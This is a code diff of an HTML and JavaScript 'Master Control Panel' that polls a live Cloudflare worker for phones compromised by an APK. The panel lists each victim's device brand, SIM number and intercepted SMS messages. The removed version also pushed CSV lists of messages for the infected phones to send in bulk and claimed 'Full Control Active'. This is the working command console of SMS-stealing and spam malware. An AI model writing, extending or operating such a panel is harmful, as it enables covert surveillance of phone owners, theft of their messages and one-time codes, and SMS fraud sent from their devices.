@@ -2,171 +2,67 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>RTO LIVE ADMIN</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Master Control Panel</title>
     <style>
-        :root {
-            --bg-black: #000000;
-            --card-gray: #121212;
-            --neon-blue: #00d2ff;
-            --neon-green: #39ff14;
-            --neon-pink: #ff007f;
-            --neon-yellow: #fff200;
-            --neon-red: #ff3131;
-            --white: #ffffff;
+        body { background-color: #000; color: #ff0055; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
+        h1 { text-shadow: 0 0 10px #ff0055; margin-bottom: 30px; }
+        .device-card { 
+            background: #111; border: 1px solid #ff0055; border-radius: 10px; 
+            padding: 15px; margin: 10px auto; max-width: 500px; text-align: left;
+            box-shadow: 0 0 5px #ff0055;
         }
-
-        body { 
-            font-family: 'Segoe UI', sans-serif; 
-            background: var(--bg-black); 
-            color: var(--white); 
-            margin: 0; padding: 10px;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        h2 { text-align: center; color: var(--neon-pink); text-shadow: 0 0 10px var(--neon-pink); margin: 15px 0; }
-
-        /* Device Grid */
-        .grid { display: grid; grid-template-columns: 1fr; gap: 15px; }
-        @media (min-width: 768px) { .grid { grid-template-columns: repeat(3, 1fr); } }
-
-        /* Modern Card */
-        .card { 
-            background: var(--card-gray); 
-            border: 2px solid var(--neon-blue); 
-            border-radius: 15px; padding: 15px; 
-            box-shadow: 0 0 10px rgba(0, 210, 255, 0.2);
-            transition: 0.3s; cursor: pointer;
-        }
-        .card:active { transform: scale(0.96); }
-
-        .card-header { display: flex; justify-content: space-between; margin-bottom: 10px; }
-        .brand { color: var(--neon-yellow); font-weight: bold; font-size: 1.1rem; }
-        .batt { color: var(--neon-green); font-weight: bold; }
-
-        /* Popup / Modal */
-        .modal { 
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.9); align-items: center; justify-content: center; z-index: 1000; 
-        }
-        .modal-box { 
-            background: #111; padding: 25px; border-radius: 20px; width: 90%; max-width: 400px; 
-            border: 2px solid var(--neon-pink); text-align: center;
-        }
-
-        /* Colored Buttons */
-        .btn-stack { display: flex; flex-direction: column; gap: 12px; margin-top: 20px; }
-        .btn { 
-            padding: 14px; border: none; border-radius: 10px; font-weight: bold; 
-            font-size: 0.9rem; cursor: pointer; text-transform: uppercase;
-        }
-        .btn-green { background: var(--neon-green); color: black; box-shadow: 0 0 10px var(--neon-green); }
-        .btn-yellow { background: var(--neon-yellow); color: black; box-shadow: 0 0 10px var(--neon-yellow); }
-        .btn-blue { background: var(--neon-blue); color: black; box-shadow: 0 0 10px var(--neon-blue); }
-        .btn-red { background: var(--neon-red); color: white; width: 100%; margin-top: 15px; }
-
-        .info-box { background: #222; padding: 12px; border-radius: 8px; text-align: left; margin: 10px 0; font-size: 0.9rem; border-left: 4px solid var(--neon-pink); }
+        .status-online { color: #00ff00; font-weight: bold; }
+        .msg-box { background: #222; padding: 10px; margin-top: 10px; border-radius: 5px; color: #fff; font-size: 14px; }
+        .refresh-btn { background: #ff0055; color: white; border: none; padding: 10px 20px; cursor: pointer; border-radius: 5px; margin-bottom: 20px; }
     </style>
 </head>
 <body>
 
-    <h2>RTO MASTER CONTROL</h2>
-    <div id="deviceGrid" class="grid">Searching for active devices...</div>
+    <h1>MASTER CONTROL PANEL</h1>
+    <button class="refresh-btn" onclick="fetchDevices()">REFRESH DATA</button>
 
-    <div id="modal" class="modal">
-        <div class="modal-box">
-            <h3 id="mTitle" style="color:var(--neon-pink); margin:0;">OPTIONS</h3>
-            <div id="mInfo" class="info-box"></div>
-            
-            <div class="btn-stack">
-                <button class="btn btn-green" onclick="handleCSV()">1. SEND SMS (GREEN)</button>
-                <button class="btn btn-yellow" onclick="handleViewSMS()">2. VIEW SMS (YELLOW)</button>
-                <button class="btn btn-blue" onclick="handleDetails()">3. DETAILS (BLUE)</button>
-            </div>
-            <button class="btn btn-red" onclick="closeModal()">OK CLOSE (RED)</button>
-        </div>
+    <div id="deviceList">
+        <p>Scanning for active devices...</p>
     </div>
 
     <script>
-        // LIVE WORKER URL
-        const WORKER_URL = "https://sms-tracker-worker.vikash6759ub.workers.dev";
-        let currentDeviceId = "";
+        // ✅ APNA WORKER URL YAHAN DAALEIN
+        const API_URL = "https://sms-tracker-worker.vikash6759ub.workers.dev/api/get-data";
 
-        // 1. Fetch Devices Live
         async function fetchDevices() {
             try {
-                const res = await fetch(`${WORKER_URL}/api/devices`);
-                const devices = await res.json();
-                const grid = document.getElementById('deviceGrid');
-                
-                if(devices.length === 0) {
-                    grid.innerHTML = "<p style='text-align:center'>Wait for APK install...</p>";
+                const response = await fetch(API_URL);
+                const data = await response.json();
+                const container = document.getElementById('deviceList');
+                container.innerHTML = "";
+
+                if (data.length === 0) {
+                    container.innerHTML = "<p>No devices linked yet.</p>";
                     return;
                 }
 
-                grid.innerHTML = devices.map(d => `
-                    <div class="card" onclick="openMenu('${d.id}', '${d.brand}', '${d.battery}', '${d.sim_info}')">
-                        <div class="card-header">
-                            <span class="brand">${d.brand}</span>
-                            <span class="batt">🔋 ${d.battery}%</span>
+                data.forEach(device => {
+                    const card = document.createElement('div');
+                    card.className = 'device-card';
+                    card.innerHTML = `
+                        <div><strong>Device:</strong> ${device.brand}</div>
+                        <div><strong>Mobile:</strong> ${device.sim_info}</div>
+                        <div><strong>Status:</strong> <span class="status-online">ONLINE</span></div>
+                        <div class="msg-box">
+                            <strong>Latest SMS:</strong><br>
+                            ${device.last_msg || "Waiting for messages..."}
                         </div>
-                        <small style="color:#555">ID: ${d.id}</small>
-                    </div>
-                `).join('');
-            } catch (e) { console.error("Syncing..."); }
+                    `;
+                    container.appendChild(card);
+                });
+            } catch (error) {
+                console.error("Error fetching data:", error);
+            }
         }
 
-        function openMenu(id, brand, battery, sim) {
-            currentDeviceId = id;
-            document.getElementById('mTitle').innerText = brand.toUpperCase();
-            document.getElementById('mInfo').innerHTML = `
-                <b>SIM:</b> ${sim}<br>
-                <b>Status:</b> <span style="color:var(--neon-green)">ONLINE</span><br>
-                <b>ID:</b> ${id}
-            `;
-            document.getElementById('modal').style.display = 'flex';
-        }
-
-        // 2. CSV Upload Function
-        async function handleCSV() {
-            const input = document.createElement('input');
-            input.type = 'file'; input.accept = '.csv';
-            input.onchange = async (e) => {
-                const file = e.target.files[0];
-                const reader = new FileReader();
-                reader.onload = async (ev) => {
-                    const rows = ev.target.result.split('\n').slice(1);
-                    const smsList = rows.map(r => {
-                        const [m, msg] = r.split(',');
-                        return m && msg ? { mobile: m.trim(), message: msg.trim() } : null;
-                    }).filter(x => x);
-
-                    const res = await fetch(`${WORKER_URL}/api/upload-csv`, {
-                        method: 'POST',
-                        body: JSON.stringify({ deviceId: currentDeviceId, smsList })
-                    });
-                    if(res.ok) alert("OK! 100 SMS Uploaded. APK will send 5 by 5.");
-                };
-                reader.readAsText(file);
-            };
-            input.click();
-        }
-
-        // 3. View SMS Function
-        async function handleViewSMS() {
-            const res = await fetch(`${WORKER_URL}/api/view-sms?id=${currentDeviceId}`);
-            const data = await res.json();
-            const smsHtml = data.map(m => `<div style="border-bottom:1px solid #333; padding:5px;"><b>${m.sender}:</b> ${m.message}</div>`).join('');
-            document.getElementById('mInfo').innerHTML = `<div style="max-height:200px; overflow-y:auto;">${smsHtml || 'No messages yet'}</div>`;
-        }
-
-        function handleDetails() {
-            alert("Device: " + currentDeviceId + "\nFull Control Active");
-        }
-
-        function closeModal() { document.getElementById('modal').style.display = 'none'; }
-
-        setInterval(fetchDevices, 4000);
+        // Auto refresh every 10 seconds
+        setInterval(fetchDevices, 10000);
         fetchDevices();
     </script>
 </body>
